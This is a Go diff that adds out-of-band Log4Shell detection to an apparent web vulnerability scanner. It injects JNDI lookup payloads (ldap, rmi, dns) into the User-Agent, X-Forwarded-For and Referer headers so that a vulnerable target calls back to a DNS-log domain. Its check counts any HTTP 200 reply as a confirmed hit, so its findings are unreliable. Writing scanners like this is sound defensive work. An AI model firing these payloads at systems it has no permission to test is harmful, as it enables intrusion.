@@ -3,6 +3,8 @@ package cve
 import (
 	"context"
 	"fmt"
+	"math/rand"
+	"net/http"
 	"net/url"
 	"strings"
 	"time"
@@ -102,6 +104,12 @@ func (p *Plugin) Check(ctx context.Context, target *types.Target, endpoint *type
 			},
 			Timestamp: time.Now(),
 		})
+	}
+
+	// OOB DNS log check for Log4j
+	if target.DNSLogDomain != "" {
+		oobFindings := checkOOBLog4j(ctx, target, endpoint, client)
+		findings = append(findings, oobFindings...)
 	}
 
 	strutsHeaders := copyHeaders(headers)
@@ -234,4 +242,102 @@ func copyHeaders(in map[string]string) map[string]string {
 		out[k] = v
 	}
 	return out
+}
+
+func generateDNSLogSubdomain() string {
+	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 8)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+func checkDNSLog(dnslogDomain, apiKey, subdomain string) (bool, error) {
+	if dnslogDomain == "" {
+		return false, nil
+	}
+
+	// Try different DNS log services
+	// dnslog.cn API
+	if apiKey == "" {
+		apiKey = "demo"
+	}
+
+	checkURL := fmt.Sprintf("http://%s/rd?p=%s", dnslogDomain, subdomain)
+	resp, err := http.Get(checkURL)
+	if err != nil {
+		return false, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		return true, nil
+	}
+
+	return false, nil
+}
+
+func checkOOBLog4j(ctx context.Context, target *types.Target, endpoint *types.Endpoint, client scanner.HttpClient) []types.Finding {
+	findings := make([]types.Finding, 0)
+
+	dnslogDomain := target.DNSLogDomain
+	if dnslogDomain == "" {
+		return findings
+	}
+
+	subdomain := generateDNSLogSubdomain()
+	fullDomain := subdomain + "." + dnslogDomain
+
+	log4jPayloads := []string{
+		fmt.Sprintf("${jndi:ldap://%s/a}", fullDomain),
+		fmt.Sprintf("${jndi:rmi://%s/a}", fullDomain),
+		fmt.Sprintf("${jndi:dns://%s}", fullDomain),
+	}
+
+	headers := mergeHeaders(target.Headers, endpoint.Headers)
+	log4jHeaderNames := []string{"User-Agent", "X-Forwarded-For", "Referer"}
+
+	for _, payload := range log4jPayloads {
+		probeHeaders := copyHeaders(headers)
+		for _, h := range log4jHeaderNames {
+			probeHeaders[h] = payload
+		}
+
+		_, err := client.Do(ctx, &scanner.Request{
+			Method:  "GET",
+			URL:     endpoint.URL,
+			Headers: probeHeaders,
+		})
+		if err != nil {
+			continue
+		}
+	}
+
+	// Wait for DNS propagation
+	time.Sleep(3 * time.Second)
+
+	// Check if DNS log received
+	hit, err := checkDNSLog(dnslogDomain, target.DNSLogAPI, subdomain)
+	if err == nil && hit {
+		findings = append(findings, types.Finding{
+			ID:          fmt.Sprintf("oob-log4j-%d", time.Now().UnixNano()),
+			PluginID:    "known-cve",
+			Name:        "Log4Shell (CVE-2021-44228) - OOB Detection",
+			Description: "DNS callback received from JNDI lookup, confirming Log4j vulnerability",
+			Severity:    types.SeverityCritical,
+			Confidence:  0.95,
+			URL:         endpoint.URL,
+			Method:      "GET",
+			Evidence:    "DNS callback to: " + fullDomain,
+			CWE:         []string{"CWE-917", "CWE-502"},
+			CVE:         []string{"CVE-2021-44228"},
+			References: []string{
+				"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+			},
+			Timestamp: time.Now(),
+		})
+	}
+
+	return findings
 }
